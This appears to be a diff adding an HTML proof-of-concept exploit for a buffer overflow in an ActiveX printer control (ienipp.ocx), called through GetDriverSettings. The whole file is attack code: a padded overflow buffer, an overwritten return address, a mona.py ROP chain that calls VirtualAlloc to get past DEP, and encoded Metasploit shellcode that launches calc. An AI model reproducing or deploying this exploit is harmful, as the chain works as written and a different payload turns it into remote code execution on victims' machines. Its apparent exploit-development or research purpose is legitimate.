@@ -1,0 +1,165 @@
+<html>
+<object classid='clsid:36723F97-7AA0-11D4-8919-FF2D71D0D32C' id='target'>
+</object>
+<script >
+
+offset_to_eip = 717;
+offset_to_esp = 737;
+buffer_length = 1000;
+
+function addressToString(address_string)
+{
+   if (address_string.length != 8) 
+   {
+      alert("Invalid address!");
+      return;
+   }
+
+   hex_byte1 = address_string.substring(0, 2);
+   hex_byte2 = address_string.substring(2, 4);
+   hex_byte3 = address_string.substring(4, 6);
+   hex_byte4 = address_string.substring(6);
+   
+   address = "%" + hex_byte4 + "%" + hex_byte3 + "%" + hex_byte2 + "%" + hex_byte1;
+   
+   return unescape(address);
+}
+
+function opcodesToString(opcodes_string)
+{
+   if (opcodes_string.length % 2 != 0) 
+   {
+      alert("Invalid opcodes!");
+      return;
+   }
+   
+   opcodes = '';
+   for (i=0; i < opcodes_string.length; i += 2)
+   {
+      opcodes += "%" + opcodes_string.substring(i, i+2);
+   }
+   
+   return unescape(opcodes);
+}
+
+
+// # msfpayload windows/exec cmd=calc R | msfencode -e x86/alpha_mixed -b '\x00\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f' -t c
+// [*] x86/alpha_mixed succeeded with size 440 (iteration=1)
+shellcode = "";
+shellcode += opcodesToString("5459d9cfd971f45850594949494949");
+shellcode += opcodesToString("494949494943434343434337515a6a");
+shellcode += opcodesToString("415850304130416b41415132414232");
+shellcode += opcodesToString("424230424241425850384142754a49");
+shellcode += opcodesToString("496c68684b3263305770333053504c");
+shellcode += opcodesToString("4959754651395050646c4b46306470");
+shellcode += opcodesToString("4e6b3142544c6e6b636256744c4b52");
+shellcode += opcodesToString("525138566f4d67626a35763031596f");
+shellcode += opcodesToString("6c6c356c3171434c7332746c67506f");
+shellcode += opcodesToString("317a6f766d677158476d3238725142");
+shellcode += opcodesToString("53674e6b427244504c4b737a674c4e");
+shellcode += opcodesToString("6b526c745164384d33326845516851");
+shellcode += opcodesToString("46316c4b43694750333148534c4b43");
+shellcode += opcodesToString("7946783973374a72694e6b50346e6b");
+shellcode += opcodesToString("677139464471796f6c6c4a61484f44");
+shellcode += opcodesToString("4d75516f376658597043454a567553");
+shellcode += opcodesToString("334d3968674b316d71343435497436");
+shellcode += opcodesToString("386c4b5638746445516a7361766c4b");
+shellcode += opcodesToString("644c326b4e6b5058454c466158536e");
+shellcode += opcodesToString("6b43344e6b73314e306f7947345754");
+shellcode += opcodesToString("6134536b314b35313369505a436169");
+shellcode += opcodesToString("6f5970536f636f614a6c4b72326a4b");
+shellcode += opcodesToString("6c4d636d517a56614c4d4c454e5273");
+shellcode += opcodesToString("30433053304630535834716e6b506f");
+shellcode += opcodesToString("4d57396f6b654d6b48706d65493253");
+shellcode += opcodesToString("6632486f566e754d6d4d4d4b4f4e35");
+shellcode += opcodesToString("656c3776516c744a6d50696b697051");
+shellcode += opcodesToString("6577754f4b537747633342724f735a");
+shellcode += opcodesToString("455061436b4f5a7562435061306c72");
+shellcode += opcodesToString("4333304141");
+
+junk1 = '';
+for (counter=0; counter < offset_to_eip - shellcode.length; counter++) junk1 += 'X';
+
+eip = addressToString("5c075142");
+
+junk2 = '';
+for (counter=0; counter < (offset_to_esp - offset_to_eip - eip.length); counter++) junk2 += 'Y';
+
+// rop chain generated with mona.py - www.corelan.be
+// Register setup for VirtualAlloc() :
+// --------------------------------------------
+// EAX = ptr to &VirtualProtect()
+// ECX = lpOldProtect (ptr to W address)
+// EDX = NewProtect (0x40)
+// EBX = dwSize
+// ESP = lPAddress (automatic)
+// EBP = POP (skip 4 bytes)
+// ESI = ptr to JMP [EAX]
+// EDI = ROP NOP (RETN)
+// + place ptr to "jmp esp" on stack, below PUSHAD
+// --------------------------------------------
+rop_chain = 
+      addressToString("1001b672") + // # POP EAX # RETN [ienipp.ocx]
+      addressToString("ffffffff") + // # Value to negate, will become 00000001
+      addressToString("5c09cfd3") + // # NEG EAX # RETN [NIPPLIB.DLL] 
+      addressToString("5c08d949") + // # XCHG EAX,EBX # RETN [NIPPLIB.DLL] 
+      addressToString("100358e9") + // # POP EAX # RETN [ienipp.ocx] 
+      addressToString("7fffcffb") + // # put delta into eax (-> put 00001000 into edx)
+      addressToString("10017001") + // # ADD EAX,80004005 # RETN 08 [ienipp.ocx] 
+      addressToString("5c06a72a") + // # XCHG EAX,EDX # RETN 00 [NIPPLIB.DLL] 
+      addressToString("41414141") + // # Filler (RETN offset compensation)
+      addressToString("41414141") + // # Filler (RETN offset compensation)
+      addressToString("10014e21") + // # POP EAX # RETN [ienipp.ocx] 
+      addressToString("ffffffc0") + // # Value to negate, will become 00000040
+      addressToString("5c0abe26") + // # NEG EAX # RETN [NIPPLIB.DLL] 
+      addressToString("1003eab9") + // # XCHG EAX,ECX # POP EDI # ADD EAX,8 # POP ESI # POP EBP # RETN 04 [ienipp.ocx] 
+      addressToString("41414141") + // # Filler (compensate)
+      addressToString("41414141") + // # Filler (compensate)
+      addressToString("41414141") + // # Filler (compensate)
+      addressToString("5c075ffc") + // # POP EDI # RETN [NIPPLIB.DLL] 
+      addressToString("41414141") + // # Filler (RETN offset compensation)
+      addressToString("1001b673") + // # RETN (ROP NOP) [NIPPLIB.DLL]
+      addressToString("5c076774") + // # POP ESI # RETN [NIPPLIB.DLL] 
+      addressToString("5c01bbc0") + // # JMP [EAX] [NIPPLIB.DLL]
+      addressToString("1004b13f") + // # POP EAX # RETN [ienipp.ocx]
+      addressToString("100521ff") + // # ptr to &kernel32!virtualallocstub [ienipp.ocx] 
+      addressToString("5c058f51") + // # INC EAX # RETN [NIPPLIB.DLL]
+      addressToString("5c0ae14f") + // # POP EBP # RETN [NIPPLIB.DLL]
+      addressToString("5c0ae14f") + // # skip 4 bytes [NIPPLIB.DLL]
+      addressToString("5c0839e1") + // # PUSHAD # RETN [NIPPLIB.DLL] 
+      addressToString("5c0635b2");  // # ptr to 'push esp # ret ' [NIPPLIB.DLL]
+ 
+jmp_back = opcodesToString("b8c0ffffff") +   // mov  eax, 0xffffffc0
+           opcodesToString("f7d8") +         // neg  eax
+           opcodesToString("50") +           // push eax
+           opcodesToString("b8ffefffff") +   // mov  eax, 0xffffefff
+           opcodesToString("f7d8") +         // neg  eax
+           opcodesToString("48") +           // dec  eax
+           opcodesToString("50") +           // push eax
+           opcodesToString("53") +           // push ebx
+           opcodesToString("54") +           // push esp
+           opcodesToString("58") +           // pop eax
+           opcodesToString("05b7fcffff") +   // add eax,-349h
+           opcodesToString("50") +           // push eax
+           opcodesToString("50") +           // push eax
+           opcodesToString("b8ff210510") +   // mov  eax, 0x100521ff
+           opcodesToString("40") +           // inc eax
+           opcodesToString("ff20");          // jmp [eax]
+   
+junk3 = '';
+for (counter=0; counter < (buffer_length - shellcode.length - junk1.length - eip.length - junk2.length - rop_chain.length - jmp_back.length); counter++) junk3 += 'Z';
+
+ret = '';
+ret += shellcode + junk1 + eip + junk2 + rop_chain + jmp_back + junk3;
+
+arg1 = 'printer';
+arg2 = 'realm';
+arg3 = 'user';
+arg4 = 'pass';
+
+alert("Attach debugger and set a breakpoint to 0x5c075142!");
+
+target.GetDriverSettings(ret,arg2,arg3,arg4);
+
+</script>
+</html>
